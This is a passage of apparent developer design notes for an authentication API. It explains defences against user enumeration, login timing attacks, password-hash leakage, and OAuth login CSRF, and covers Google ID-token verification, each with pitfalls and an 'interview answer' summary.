- Treating this as a solved, "cookies are just better" or "localStorage
  is just better" question — it's a genuine tradeoff between two attack
  classes (XSS vs. CSRF), not a strictly-dominant choice either way.
- Choosing `httpOnly` cookies without also implementing CSRF protection
  — that combination is worse than either mitigation alone, since it
  closes the XSS-exfiltration vector while leaving CSRF fully open.

**Production considerations.** If XSS risk is the primary concern for
this project's frontend (e.g. it renders significant user-generated
content), `httpOnly` cookies plus explicit CSRF protection would be the
stronger production posture. `localStorage` is a reasonable, simpler
choice for a project where the frontend is fully controlled, first-party
code with limited XSS surface — which is the assumption this phase makes
implicitly by returning the token in the response body. This is a
decision worth revisiting explicitly if the frontend's threat model
changes.

**Interview answer.** Storing a JWT in `localStorage` makes it readable
by any JavaScript on the page, so it's vulnerable to token theft via
XSS but immune to CSRF, since cookies aren't involved. An `httpOnly`
cookie can't be read by JavaScript at all, closing that XSS-exfiltration
path, but the browser attaches cookies to requests automatically for any
origin, which opens up CSRF unless mitigated separately with something
like `SameSite` plus a CSRF token. This API returns the token in the
JSON response body rather than setting a cookie itself, implicitly
choosing the `localStorage`-style model and leaving cookie-based storage
(and its CSRF-mitigation requirements) as the frontend's decision.

---

### User enumeration and why login errors are deliberately vague

**What it is.** User enumeration is an attack where a service's
different responses to "this email doesn't exist" versus "this email
exists but the password was wrong" let an attacker build a list of valid
registered emails, without ever guessing a correct password.

**Why it exists in this project.** `authService.login` throws the exact
same `AppError` — same status code (401), same literal message
(`'Invalid email or password'`) — whether the email doesn't exist at all
or exists with a non-matching password. `tests/services/authService.test.ts`
and `tests/routes/auth.test.ts` both assert this with `.toBe()` string
equality specifically to prevent a future edit from accidentally letting
the two messages drift apart.

**How it works mechanically.** Both failure branches inside `login`
converge on one `throw unauthorized(INVALID_CREDENTIALS_MESSAGE)` call
site's message (the constant is reused, not two separately-written
string literals that could diverge over time). A response body alone
gives an attacker no signal about which of the two cases occurred. (The
_timing_ of the response is a separate channel this same code path also
has to close — see the next section.)

**Where it lives in the codebase.** `src/services/authService.ts` —
`login`, `INVALID_CREDENTIALS_MESSAGE`.

**Common pitfalls.**

- Writing genuinely helpful-sounding but distinct error messages
  ("No account found with that email" vs. "Incorrect password") — this
  is the single most common enumeration bug, usually introduced with
  good UX intentions.
- Fixing the _message_ but leaving a _status code_ or _response shape_
  difference between the two branches (e.g. 404 for no-such-user, 401
  for wrong-password) — enumeration only requires _some_ distinguishable
  signal, not specifically the message text.
- Fixing the response but not the _timing_ — see next section.

**Production considerations.** Signup's 409 ("email already exists") is
a deliberate, different kind of disclosure that this project accepts:
knowing whether an email is _registered_ (via signup's conflict
response) is considered acceptable here, while knowing whether a
_login attempt_ against that email succeeded partially (right email,
wrong password) is not. That's a judgment call, not a universal rule —
some systems also obscure signup conflicts (e.g. "if this email isn't
already registered, we've sent a confirmation" regardless of whether it
is) for stricter enumeration resistance, at the cost of a worse signup
UX (a user can't get instant feedback that they should log in instead).

**Interview answer.** User enumeration is when an attacker learns which
emails have accounts just by observing how a login endpoint responds
differently to "no such user" versus "wrong password." This project's
login always returns the identical status code and message string for
both cases — verified by tests that check exact string equality between
the two failure paths — so a response body alone never leaks which
scenario occurred.

---

### Timing attacks on login, and the dummy-hash mitigation

**What it is.** Even with identical error _messages_, two code paths can
still take measurably different amounts of _time_ to respond — and an
attacker measuring response latency precisely enough can use that timing
difference as its own side-channel, independent of what the response
body says.

**Why it exists in this project.** Without a mitigation, `login`'s
"no such user" branch would return almost immediately (one fast indexed
`SELECT`, no row found), while its "wrong password" branch would take
the ~200-300ms a real bcrypt comparison costs (at `BCRYPT_COST=12`).
That gap is large and consistent enough to distinguish the two cases by
timing alone, even though the response bodies are byte-for-byte
identical — reopening the exact user-enumeration problem the previous
section closed via the response body.

**How it works mechanically.** `passwordService.ts` precomputes
`DUMMY_PASSWORD_HASH` once, at module load, by hashing an arbitrary
fixed string at the live `config.BCRYPT_COST`. `login`'s "no such user
or OAuth-only account" branch calls `verifyAgainstDummyHash(password)`
— discarding the boolean result entirely — purely to force one bcrypt
comparison of matching cost before throwing the 401. That makes both
branches of `login` perform exactly one bcrypt `compare()` call at the
same cost factor, so their timing profiles converge. Using
`config.BCRYPT_COST` for the dummy hash (rather than a hardcoded cost)
matters specifically because a bcrypt hash string embeds its own cost
factor, and `compare()`'s runtime is dominated by that embedded cost —
a dummy hash baked at a stale or different cost would still leak a
smaller, but measurable, timing gap against real per-user hashes.

**Where it lives in the codebase.** `DUMMY_PASSWORD_HASH` and
`verifyAgainstDummyHash` in `src/services/passwordService.ts`; consumed
in `authService.login`'s no-such-user/no-password-hash branch.

**Common pitfalls.**

- Skipping the dummy comparison as an "optimization" for the common
  case (nonexistent email) — that's precisely the branch that needs the
  extra work, not the one that can skip it.
- Baking the dummy hash at a fixed cost independent of
  `config.BCRYPT_COST` — reintroduces a smaller version of the same
  timing gap if the two costs ever diverge (e.g. after a future
  production cost-factor bump that forgets to update a hardcoded dummy).
- Believing this mitigation is exact — see below.

**Production considerations — does this fully close the attack?** Not
perfectly. It equalizes the _dominant_ cost (one bcrypt comparison at
matching cost) between the two branches, which is by far the largest
contributor to the timing gap and closes the attack for realistic,
network-latency-bounded measurement. It does **not** account for smaller
differences — e.g. the "no such user" path still runs one `SELECT`
before hitting the dummy-hash branch, and the "wrong password" path runs
a structurally similar `SELECT` before its real comparison, so those
are actually symmetric here — but a sufficiently patient, low-noise
attacker with many samples (statistical timing analysis, typically
requiring local network access or extreme measurement precision) could
in principle still detect a much smaller residual signal. This
mitigation defeats the attack under realistic conditions (a remote
attacker over normal internet latency); it is a mitigation, not a
mathematical proof of zero timing leakage.

**Interview answer.** Even with identical error messages, "no such
user" and "wrong password" naturally take different amounts of time —
one skips the expensive bcrypt comparison entirely, the other pays for
it — and that timing gap is its own side-channel for user enumeration.
The mitigation is to always perform one bcrypt comparison of matching
cost regardless of which branch is taken: this project precomputes a
dummy hash at the live cost factor and compares against it (discarding
the result) on the no-such-user path, so both branches' timing profiles
converge. It closes the attack under realistic network conditions but
isn't a mathematical guarantee against a very patient, high-precision
statistical attacker.

---

### Why password_hash must never be selected or returned casually

**What it is.** A deliberate, structural discipline in
`src/services/authService.ts`: `password_hash` is never included in a
`SELECT *`, never present in the `AuthUser` shape returned to routes,
and only ever selected in the one function (`login`) that actually needs
it, into a query-local type that isn't reused anywhere else.

**Why it exists in this project.** A single accidental
`res.json(user)` where `user` came from a `SELECT *`-style query would
leak every user's bcrypt hash straight into an API response — and unlike
most bugs, this one wouldn't necessarily be obvious in casual testing
(the response would still "look right" — a JSON object with an extra
field most people wouldn't immediately flag as a live secret).

**How it works mechanically.** Three independent layers each make this
mistake harder, not just one:

1. **Explicit column lists everywhere.** Every query in
   `authService.ts` names its columns (`SELECT id, email, email_verified,
created_at, updated_at [, password_hash]`) — never `SELECT *`. A
   future column added to `users` doesn't silently start flowing through
   existing queries.
2. **The `AuthUser` TypeScript interface has no `password_hash` field at
   all.** `login`'s one query that _does_ select `password_hash` reads
   it into a separate, query-local row type
   (`UserRow & { password_hash: string | null }`), and `toAuthUser()`
   only ever reads the five named safe fields off of it. There's no
   field for a future typo (`user.password_hash`) to accidentally
   reference — the type itself doesn't have one.
3. **Route-level tests assert the negative.**
   `tests/routes/auth.test.ts`'s `assertNoPasswordHash` helper
   stringifies every response body from every auth endpoint and asserts
   it contains neither the string `password_hash` (any casing) nor a
   bcrypt hash prefix (`$2a$`/`$2b$`) — a test that would fail loudly if
   a future change to any of the three routes ever leaked it, even
   through an unexpected path this phase didn't anticipate.

**Where it lives in the codebase.** `src/services/authService.ts`
(`AuthUser`, `UserRow`, `toAuthUser`, every query); `tests/routes/auth.test.ts`
(`assertNoPasswordHash`).

**Common pitfalls.**

- `SELECT *` "for convenience" during development, meaning to narrow it
  later — the column list should be correct from the first query, not a
  cleanup task.
- A shared row type reused across both a hash-needing function (`login`)
  and hash-excluding functions (`signup`, `getUserById`) — this
  invites exactly the kind of accidental field access the separate
  query-local type in `login` avoids.
- Testing only the "happy path" shape of a response (e.g. asserting
  `user.email` is correct) without also asserting what's _absent_ — a
  positive-only test suite can pass indefinitely while quietly leaking
  an extra field.

**Production considerations.** None beyond continuing this same
discipline as the schema and query surface grow — the pattern (explicit
columns, a type that structurally excludes sensitive fields, and a test
that asserts the negative) generalizes to any other sensitive column a
future phase might add.

**Interview answer.** `password_hash` is kept out of API responses
through three independent layers rather than one: every query in
`authService.ts` uses an explicit column list instead of `SELECT *`, the
`AuthUser` type returned to routes structurally has no field for it at
all so a typo can't reference one, and the route tests assert the
negative — stringifying every auth response and checking it never
contains the string `password_hash` or a bcrypt hash prefix. Layering
independent protections matters because any single one of them could be
accidentally bypassed by a future change; having all three means a leak
requires breaking every layer at once, and the test layer specifically
catches leaks through paths this phase didn't anticipate.

---

### Why expired and invalid tokens produce an identical client message

**What it is.** `requireAuth` and `tokenService.verifyToken` distinguish
`expired` from `invalid` internally (`VerifyTokenResult`'s discriminated
union), but `requireAuth` always sends the client the same 401 message —
`'Invalid or expired token'` — regardless of which one occurred. The
distinction is logged server-side (`req.log.warn({ reason }, ...)`) and
never exposed in the response.

**Why it exists in this project.** If a client could reliably tell
"expired" apart from "invalid" from the response alone, that's a real
information leak: "expired" specifically confirms the token was
**structurally valid and correctly signed with the real `JWT_SECRET` at
some point** — i.e., it was a genuine token issued by this server for a
real user, just stale. "Invalid" covers everything else — wrong secret,
tampered payload, pure garbage input, a token forged with a guessed
secret that happened to be wrong. An attacker holding a captured or
intercepted token (from, say, a browser history, an old log line, a lost
device) who could distinguish the two would learn whether that token was
ever a genuine, live credential worth further effort (replay attempts,
social-engineering a session refresh, etc.) versus outright worthless —
a reconnaissance signal this project denies entirely by collapsing both
outcomes to one message.

**How it works mechanically.** `verifyToken` catches
`jwt.TokenExpiredError` specifically and returns `{ ok: false, reason:
'expired' }`; every other failure (`JsonWebTokenError`, a malformed
token, a signature that doesn't match) returns `{ ok: false, reason:
'invalid' }`. `requireAuth` branches on `result.ok` but, on failure,
calls the exact same `unauthorized('Invalid or expired token')` for
both reasons — the `reason` value is only ever passed to
`req.log.warn`, never to the response.

**Where it lives in the codebase.** `src/services/tokenService.ts`
(`VerifyTokenResult`, the `reason` distinction); `src/middleware/auth.ts`
(`requireAuth`, where the distinction stops before reaching the client).

**Common pitfalls.**

- Returning a more "helpful" client-facing message for expiry
  specifically (e.g. "Your session has expired, please log in again")
  — well-intentioned UX, but it's exactly the enumeration-style leak
  this section describes; a generic client-side "please log in again"
  prompt can be shown for _either_ reason without the server's response
  needing to say which one it was.
- Logging the token itself alongside the `reason` "for debugging" —
  `requireAuth`'s logging deliberately includes `reason` and the request
  ID, never the token, matching the same discipline as the
  Authorization-header section above.

**Production considerations.** None beyond maintaining this same
discipline if additional token-rejection reasons are ever added (e.g. a
future denylist check) — any new reason should default to the same
generic client message unless there's a specific, considered argument
for exposing it.

**Interview answer.** Internally, `verifyToken` distinguishes an expired
token from an invalid one, but the client always gets the identical
"Invalid or expired token" message either way — the distinction is only
ever logged server-side. The reason is that "expired" specifically
confirms a token was genuinely issued and correctly signed at some
point, while "invalid" covers everything else including outright
forgeries; letting a client tell those apart would hand an attacker
holding a stolen or old token a way to know whether it was ever a real,
live credential worth pursuing further, which is exactly the kind of
signal a 401 response shouldn't provide.

## Phase 5: Google OAuth

### New dependencies: google-auth-library and nock

**What it is.** One runtime dependency, `google-auth-library` (Google's
own maintained Node client for OAuth 2.0/OpenID Connect), and one dev
dependency, `nock` (intercepts outbound HTTP calls in tests). `nock`
transitively adds nothing of note; `google-auth-library` pulls in
`gaxios` (its HTTP client) and `gtoken` — expected, not a surprise to
investigate later if they show up in `package-lock.json`.

**Why it exists in this project.** Three specific calls are delegated to
`google-auth-library`, and nothing else: `generateAuthUrl` (builds the
consent-screen URL), `getToken` (exchanges a code for tokens — a plain
server-to-server HTTP POST), and `verifyIdToken` (fetches Google's JWKS,
verifies an RS256 signature, checks issuer/audience/expiry). The first
two are thin enough that hand-rolling them with `fetch` would teach
nothing extra — they're documented HTTP shapes, spelled out below.
`verifyIdToken` is different: it's real cryptographic weight (key
rotation, JWKS caching, signature verification), and getting it subtly
wrong means accepting a forged identity — the same category of risk this
project already declined to hand-roll for password hashing (`bcryptjs`)
and JWT signing (`jsonwebtoken`) in Phase 4. `nock` exists because this
phase introduces the project's first genuine external-network
dependency in tests — there's no local "real Google" the way there's a
real local Postgres/Redis for every other test.

**How it works mechanically / the alternatives.** Two alternatives were
considered and rejected. Raw `fetch` for all three calls: rejected for
`verifyIdToken` specifically, since a correct implementation needs a
JWKS client anyway (another dependency) plus careful handling of key
rotation and multiple valid issuer strings — work that doesn't teach the
OAuth flow, it teaches "how to verify RS256 JWTs against a rotating key
set," a tangential skill. `openid-client`: rejected as more machinery
than a single hardcoded provider needs — it's built for dynamic
multi-provider OIDC discovery (`.well-known` fetching, configurable
token-endpoint auth methods), and its authorization-URL builder is less
explicit about what parameters go in than `google-auth-library`'s
`generateAuthUrl({ scope, state })`, where every parameter is one this
codebase passes by hand.

**Where it lives in the codebase.** `src/services/oauthService.ts` owns
the `OAuth2Client` instance and all three calls. `nock` is used only in
`tests/services/oauthService.test.ts`, intercepting
`https://oauth2.googleapis.com/token`.

**Common pitfalls.**

- Treating `google-auth-library` as a black box that "does OAuth" —
  every parameter passed into `generateAuthUrl`/`getToken` is chosen
  explicitly in `oauthService.ts`; only the JWKS-fetch/signature-verify
  internals of `verifyIdToken` are actually opaque.
- Mocking `verifyIdToken`'s return value in tests without also asserting
  what it was _called with_ — a stub returns the same canned payload no
  matter its arguments, so a regression that dropped the `audience`
  check would pass silently. See the testing subsection below.
- Forgetting that `getToken`/`verifyIdToken` are genuine network calls —
  calling them from an unmocked test hits real Google infrastructure,
  which is slow, flaky in CI, and forbidden by this phase's constraints.

**Production considerations.** `google-auth-library` is Google's own
first-party client, actively maintained alongside their APIs — when
Google rotates signing keys or changes an issuer string, this dependency
gets updated to match, which a hand-rolled JWKS client would need
someone here to notice and fix manually.

**Interview answer.** I used Google's own client library for exactly
three calls — building the auth URL, exchanging a code for tokens, and
verifying the returned identity token — and hand-rolled everything else
(state generation, the route logic, find-or-create). The one piece I
didn't hand-roll, `verifyIdToken`, is the one with real cryptographic
weight: JWKS fetching, key rotation, RS256 signature verification. That's
the same category of decision as using `bcryptjs` for password hashing —
not laziness, but recognizing that a subtly wrong hand-rolled
implementation there means identity spoofing, not just a bug.

---

### The OAuth 2.0 authorization code flow, end to end

**What it is.** A four-party handshake — browser, our API (the "client"
in OAuth terms), Google's authorization server, and Google's resource/
identity data — that lets a user prove their Google identity to our
server without ever handing our server their Google password.

**Why it exists in this project.** It's the mechanism behind `GET
/api/auth/google` and `GET /api/auth/google/callback`, and it's the
reason those two routes exist as a pair rather than one endpoint: the
flow inherently has two legs, a redirect out to Google and a redirect
back.

**How it works mechanically.** Step by step, naming what each party
knows at each point:

1. Browser hits `GET /api/auth/google`. Our API generates a random
   `state`, stores it in Redis, and redirects the browser to Google's
   consent screen with `client_id`, `redirect_uri`, `scope`, `state`, and
   `response_type=code` in the URL. _Our API knows:_ the state it just
   issued. _The browser knows:_ nothing new yet, just a URL to follow.
   _Google knows:_ nothing yet — this is the first request it sees.
2. Browser lands on Google's real consent screen, authenticates with
   Google directly (our server is never involved in or shown the
   password), and approves or denies.
3. Google redirects the browser back to `GOOGLE_REDIRECT_URI` — i.e.
   `GET /api/auth/google/callback` — with `code` and the same `state` it
   was given (or `error` if denied). _The browser knows:_ an
   authorization code, but not what it's worth. _Google knows:_ it just
   authenticated this user and issued a short-lived code tied to that.
4. Our API validates `state` (see the next subsection), then calls
   Google's token endpoint **server-to-server** — the browser is not
   involved in this exchange — sending `code` plus `GOOGLE_CLIENT_SECRET`
   to prove it's really our registered server. Google responds with
   tokens, including an `id_token` (a signed JWT asserting identity).
   _Our API now knows:_ a verified Google identity (sub, email,
   email_verified). _Google knows:_ it just handed identity/access
   tokens to whoever holds the client secret.
5. Our API verifies the `id_token`, finds or creates a local user, signs
   **our own** JWT, and redirects the browser to `FRONTEND_URL?token=...`.
   _The browser now knows:_ our own session token — never Google's.

**Where it lives in the codebase.** `src/routes/auth.ts` (`GET /google`,
`GET /google/callback`); `src/services/oauthService.ts` (steps 4-5's
Google calls); `src/lib/oauthState.ts` (the state used in steps 1 and 4);
`src/services/authService.ts`'s `findOrCreateOAuthUser` (the user
lookup in step 5).

**Common pitfalls.**

- Thinking of this as one request/response — it's fundamentally two
  separate HTTP requests to our server (`/google` and `/google/callback`)
  connected only by `state` and by Google's own redirect in between.
- Forgetting the browser is a full participant that can be tampered
  with — anyone can hand-craft a request to `/google/callback` with an
  arbitrary `code`/`state`/`error`, which is exactly why state validation
  and server-side code exchange matter (both covered below).

**Production considerations.** Every step here assumes `GOOGLE_REDIRECT_URI`
exactly matches what's registered in Google Cloud Console — a mismatch
fails step 4's exchange with an opaque Google-side error, a common
first-deploy gotcha when moving from `localhost` to a real domain.

**Interview answer.** The authorization code flow is a two-leg redirect:
the browser goes to Google carrying a `state` we generated, comes back
carrying a `code` Google generated, and then our server — not the
browser — exchanges that code for tokens directly with Google, using our
client secret to prove who's asking. The browser only ever sees an
opaque code and, at the very end, our own session token; it never sees
Google's access token or our client secret.

---

### Why the browser gets a code, not a token; why the implicit flow is deprecated

**What it is.** The authorization code flow hands the _browser_ only a
short-lived `code`, which is worthless without the client secret. The
now-deprecated OAuth "implicit flow" instead put an access token
directly in the redirect URL's fragment, for JavaScript to read.

**Why it exists in this project.** `GET /api/auth/google/callback`
receives a `code` and does the token exchange itself, server-side —
this project never puts a Google access token or `id_token` in a URL the
browser can read.

**How it works mechanically.** A URL fragment (`#access_token=...`) is
visible to browser extensions, gets logged by some proxies/analytics
tools, lands in browser history, and — critically — is visible to any
JavaScript running on the page, including malicious or compromised
third-party scripts. A `code`, by contrast, is useless on its own: it
must be paired with `GOOGLE_CLIENT_SECRET` (something only the server
holds) to become a real token, and Google additionally makes each code
single-use and short-lived. So even if a `code` leaks in a browser
history or a referrer header, an attacker still can't redeem it without
the secret, and it likely already expired.

**Where it lives in the codebase.** The callback handler in
`src/routes/auth.ts` only ever receives `code`/`state`/`error` as query
parameters — never a token — and the actual exchange happens inside
`exchangeCodeForIdentity` in `src/services/oauthService.ts`, which never
returns Google's raw tokens to its caller (only a verified `GoogleIdentity`).

**Common pitfalls.**

- Building an SPA-style flow that puts any Google token in a URL,
  `localStorage`, or anywhere JavaScript can read it — this project's
  browser-facing surface is only ever our own JWT, at the very end of
  the flow, via `?token=` on the `FRONTEND_URL` redirect.
- Assuming "server-side" is automatically enough — the code exchange
  being server-to-server is necessary but not sufficient; it's only safe
  _because_ it also requires the client secret, which the implicit flow
  had no equivalent for.

**Production considerations.** The implicit flow is formally deprecated
in OAuth 2.0's current best-practice guidance (RFC 9700) specifically
because there's no scenario left where it's safer than authorization
code + PKCE (for public clients) or authorization code alone (for
confidential clients like this server, which can hold a secret).

**Interview answer.** The browser only ever gets a `code`, not a token,
because a code is useless without the client secret — something only our
server holds. That means even if a code leaks (browser history, a
referrer header, a compromised extension), it can't be redeemed by
anyone but us, and it's single-use and short-lived besides. The older
implicit flow put the actual access token in the URL for JavaScript to
read directly, which is why it's deprecated — anything in a URL fragment
or that JavaScript can touch is far more exposed than a code that
requires a secret to mean anything.

---

### The state parameter: the login-CSRF attack it prevents

**What it is.** A cryptographically random, single-use, short-lived
token (`generateState()` in `src/lib/oauthState.ts`) that our server
generates before redirecting to Google, and requires back — unchanged —
on the callback.

**Why it exists in this project.** Without it, `GET
/api/auth/google/callback?code=...` would accept _any_ code sent to it,
from anywhere. That's exploitable: an attacker can complete their own
Google login, capture the `code` Google issues _them_, and trick a
victim's browser into visiting `/api/auth/google/callback?code=<attacker's
code>` (an `<img>` tag, a crafted link, anything that makes the victim's
browser issue that GET). The victim's browser has no way to know this
code doesn't belong to them — it's just a URL. Our server would exchange
the attacker's code, find-or-create (or log into) the _attacker's_
Google-linked account, and hand the _victim's_ browser a valid session
token for the attacker's account. The victim is now unknowingly logged
in as the attacker — and anything the victim subsequently does (saving
links, connecting data) happens inside the attacker's account, which the
attacker controls and can review at their leisure. This is "login CSRF":
forging not an action, but an entire authenticated session.

**How it works mechanically.** `generateState()` produces 32 random
bytes (`node:crypto`'s `randomBytes`, base64url-encoded) — far more
entropy than needed to make guessing infeasible. `storeState()` records
it in Redis with a 10-minute TTL before the redirect to Google happens.
The callback's very first action, before even inspecting `error` or
`code`, is `consumeState()` — validate-and-delete in one atomic Redis
`GETDEL`. If the state doesn't exist (never issued, expired, or already
used), the callback throws `400` immediately and touches nothing else.
Because the attacker in the scenario above was never issued _our_
`state` value for the victim's browser to carry, their forged callback
URL either omits `state` or guesses at one — and guessing 32 random
bytes is infeasible.

**Where it lives in the codebase.** `src/lib/oauthState.ts`
(`generateState`/`storeState`/`consumeState`); `src/routes/auth.ts`'s
`/google` handler (generates+stores) and `/google/callback` handler
(consumes, first thing).

**Common pitfalls.**

- Validating `state` _after_ checking `error` or exchanging `code` —
  this project deliberately checks state first, specifically so a forged
  callback carrying `error=access_denied` and no valid state can't be
  treated as a legitimate denial (see the "handling denied consent"
  subsection).
- Using a predictable or short state value — the login-CSRF attack only
  fails because the attacker can't produce or guess a state we issued;
  a weak state reopens the whole attack.
- A get-then-delete implementation of "single-use" instead of an atomic
  check-and-delete — two requests racing on the same state could both
  read it as valid before either deletes it, reopening a narrow replay
  window. `GETDEL` closes this by making the check and the delete one
  Redis operation.

**Production considerations.** The 10-minute TTL is a deliberate balance:
long enough that a real user completing Google's consent screen (which
can involve 2FA prompts, account picking, etc.) doesn't get a state
expiring mid-flow, short enough that a leaked or intercepted callback
URL stops being useful quickly.

**Interview answer.** The state parameter defeats login CSRF — an
attacker tricking a victim's browser into completing _the attacker's_
OAuth login, which would otherwise log the victim into the attacker's
account without either of them realizing it. It works because we
generate a random, single-use, short-lived value before redirecting to
Google, and refuse to process any callback that doesn't echo that exact
value back — an attacker forging a callback URL has no way to produce or
guess it. I made state validation atomic (Redis `GETDEL`) and the very
first check in the callback, specifically so it can't be raced or
bypassed by an attacker probing other paths through the handler first.

---

### Redis as an ephemeral state store, and why not a signed cookie or the database

**What it is.** The choice of _where_ to keep `state` between issuing it
(`GET /google`) and checking it (`GET /google/callback`) — this project
picked Redis over the two other obvious options.

**Why it exists in this project.** `state` is exactly the kind of data
Redis is for: short-lived (10-minute TTL, expressed natively as `EX`),
write-once/read-once (`GETDEL`), and never needed again after the
handshake completes — none of that fits `users`, a table for permanent
records.

**How it works mechanically / the alternatives.** A signed cookie set on
`GET /google` and read back on the callback was the main alternative
considered. It would work for the simple case, but ties the state's
validity to _the same browser_ completing the round trip, and Google's
own redirect back to our callback is itself a cross-site navigation from
the browser's perspective — some browsers' cookie `SameSite` defaults
can drop cookies across exactly this kind of redirect chain, which would
break the flow intermittently and unpredictably depending on browser/
version. Storing `state` in the `users` table (or a dedicated Postgres
table) was rejected because it's not user data at all — it exists for
minutes, belongs to no user yet (the whole point is we don't know who
this is until the callback resolves), and would need its own TTL/cleanup
logic that Redis provides natively via `EX`.

**Where it lives in the codebase.** `src/lib/oauthState.ts`, built
directly on the existing shared `redis` client from `src/lib/redis.ts` —
no new connection, no new library.

**Common pitfalls.**

- Reaching for a signed cookie by default because it "feels simpler" —
  it reintroduces a cross-site cookie-delivery dependency that Redis
  entirely sidesteps.
- Forgetting to set a TTL at all if hand-rolling a similar pattern
  elsewhere — an unbounded key is a slow leak and, worse, means a stolen
  old `state` value stays exploitable indefinitely.

**Production considerations.** This is the first ephemeral (not
permanent-record) use of Redis in the codebase — `checkRedisHealth` was
the only prior usage. If a future phase needs a similar short-lived
token (email verification links, password-reset tokens), the same
generate/store/consume shape in `oauthState.ts` is the pattern to reuse,
not a new one-off table.

**Interview answer.** I stored `state` in Redis rather than a signed
cookie because the callback redirect is itself a cross-site navigation
from the browser's perspective, and cookie `SameSite` defaults can drop
cookies across exactly that kind of hop — a flow that would then break
intermittently depending on the user's browser. Redis also gives TTL and
atomic delete-on-read natively, which matches what `state` actually is:
short-lived, write-once, read-once data that doesn't belong in a
permanent table like `users`.

---

### OpenID Connect vs. plain OAuth 2.0: what the id_token adds

**What it is.** OAuth 2.0 on its own is an _authorization_ protocol — it
answers "does this app have permission to act on the user's behalf /
access this resource," via an access token. OpenID Connect (OIDC) is a
thin identity layer on top of OAuth 2.0 that adds _authentication_ —
"who is this user" — via a new artifact, the `id_token`, a signed JWT.

**Why it exists in this project.** This phase needs authentication (who
is logging in), not authorization to act on a Google resource on the
user's behalf (we never call the Gmail or Drive APIs). Requesting the
`openid` scope is exactly what turns a plain OAuth request into an OIDC
request and makes Google return an `id_token` at all — without it,
Google's token response would only contain an access token, and this
codebase would have no signed, verifiable claim about _who_ just
authenticated, only a token that's the wrong tool for identity (access
tokens are opaque-by-design and meant for calling APIs, not for a
relying party to parse and trust as identity).

**How it works mechanically.** `GOOGLE_SCOPES = ['openid', 'email',
'profile']` in `src/services/oauthService.ts` — `openid` triggers the
`id_token` in Google's response at all; `email`/`profile` are what put
`email`/`email_verified`/`name`/etc. claims inside that token. The
`id_token` itself is a JWT — three base64url segments, signed by Google
with RS256 — so unlike an opaque access token, it can be decoded and
its signature independently verified by any party that knows Google's
public keys, without calling back to Google for every check.

**Where it lives in the codebase.** `GOOGLE_SCOPES` and
`exchangeCodeForIdentity`'s use of `tokens.id_token` in
`src/services/oauthService.ts`; the resulting `GoogleIdentity` shape
(`googleId`, `email`, `emailVerified`) is what the rest of the app —
`findOrCreateOAuthUser`, the callback route — actually consumes, never
Google's access token.

**Common pitfalls.**

- Treating the OAuth _access token_ as proof of identity — it isn't; it
  proves the bearer has some permission Google granted, not who they
  are. Only the `id_token` is meant to be parsed as an identity claim.
- Forgetting the `openid` scope and being confused when Google's
  response has no `id_token` at all — this is the single most common
  first-integration mistake with Google OAuth.

**Production considerations.** None of this app's scopes grant access to
call any Google API on the user's behalf (no Gmail, Calendar, Drive) —
if a future phase ever needs that, it would add a narrower scope for
that specific API and would then need to actually store and refresh the
resulting access/refresh tokens, which this phase deliberately never
does.

**Interview answer.** Plain OAuth 2.0 answers "is this app allowed to do
X," via an access token that's opaque and meant for calling APIs. OpenID
Connect adds an identity layer on top — the `id_token`, a signed JWT
asserting who the user is — which is what this app actually needs, since
it never calls any Google API on the user's behalf. Requesting the
`openid` scope is what turns the request into an OIDC request and makes
Google include that `id_token` at all.

---

### ID token verification: audience, issuer, expiry — what each check prevents

**What it is.** Three checks `verifyIdToken` performs on the returned
`id_token`, beyond the RS256 signature check itself: that `aud` (the
token's intended recipient) matches our `GOOGLE_CLIENT_ID`, that `iss`
(who signed it) is genuinely Google, and that `exp` (expiry) hasn't
passed.

**Why it exists in this project.** A signature check alone proves "some
real Google-issued token," not "a token meant for _this application_" or
"a token that's still current" — the other two checks close gaps a
signature check leaves open.

**How it works mechanically.**

- **Audience (`aud`)** must equal `GOOGLE_CLIENT_ID`
  (`exchangeCodeForIdentity` passes `audience: config.GOOGLE_CLIENT_ID`
  explicitly). This prevents **token substitution**: Google issues
  `id_token`s to many different registered applications; without an
  audience check, a token legitimately issued to some _other_
  application (which a malicious or compromised app could relay to us)
  would pass a bare signature check just as well as one issued to us —
  the signature only proves "Google signed this for _someone_," not
  "for us."
- **Issuer (`iss`)** must be one of Google's known issuer strings. This
  prevents accepting a **correctly-signed token from the wrong
  authority** — relevant in any system that might ever verify tokens
  from more than one identity provider; checking the issuer is what
  pins verification to "specifically Google," not "any signer whose key
  we happen to trust."
- **Expiry (`exp`)** must be in the future. This prevents **replaying an
  old, once-valid token** — without it, a token captured from months ago
  (a log line, a network capture) would still verify successfully today.

**Where it lives in the codebase.** The `audience` argument to
`client.verifyIdToken(...)` in `exchangeCodeForIdentity`
(`src/services/oauthService.ts`) — the issuer and expiry checks happen
inside `google-auth-library` itself and aren't separately coded here,
which is the whole reason this phase trusts the library for this one
call rather than hand-rolling it (see the dependencies subsection above).

**Common pitfalls.**

- Skipping the audience check (or passing the wrong value) — this is the
  single most dangerous mistake here, since a missing audience check is
  invisible in normal testing (a real token from _your own_ app still
  verifies fine) and only becomes exploitable if something ever presents
  a token minted for a different client.
- Assuming signature verification alone is "identity verification" — it
  only proves authenticity of the signer, not that the token was meant
  for this application or is still current.

**Production considerations.** If this application is ever registered
with more than one `GOOGLE_CLIENT_ID` (e.g. separate web and mobile
clients sharing one backend), the audience check needs to accept an
array of valid client IDs, not a single hardcoded one — `verifyIdToken`'s
`audience` option already accepts an array for this reason.

**Interview answer.** Signature verification alone only proves "Google
genuinely signed this token for _someone_" — it doesn't prove the token
was meant for _this_ application, or that it's still current. The
audience check closes the first gap: it prevents a token minted for a
different Google-registered app from being accepted here. The issuer
check pins verification to Google specifically, and the expiry check
prevents replaying an old captured token. All three are necessary
together; signature verification is necessary but not sufficient on its
own.

---

### Why we issue our own JWT instead of using Google's tokens as our session

**What it is.** After verifying the Google identity, the callback calls
`signToken(user.id)` — the exact same `tokenService.ts` function
`signup`/`login` already use — rather than forwarding Google's
`access_token` or `id_token` to the browser as a session credential.

**Why it exists in this project.** Google's tokens describe a
relationship with _Google_ (this access token can call Google's APIs;
this id_token asserts a Google identity, valid until Google's own
expiry). They say nothing about a _Click Scope_ user id, and nothing
downstream in this app (`requireAuth`, `GET /me`, any future link-CRUD
route) should need to know or care whether a request came from a
password login or a Google login — it should see one consistent kind of
credential either way.

**How it works mechanically.** `findOrCreateOAuthUser` returns `{ user,
token }` with the exact same shape `signup`/`login` return; `token` here
is `signToken(user.id)` — an HS256 JWT with only `sub`/`iat`/`exp`,
signed with `JWT_SECRET`, identical in structure to a password-login
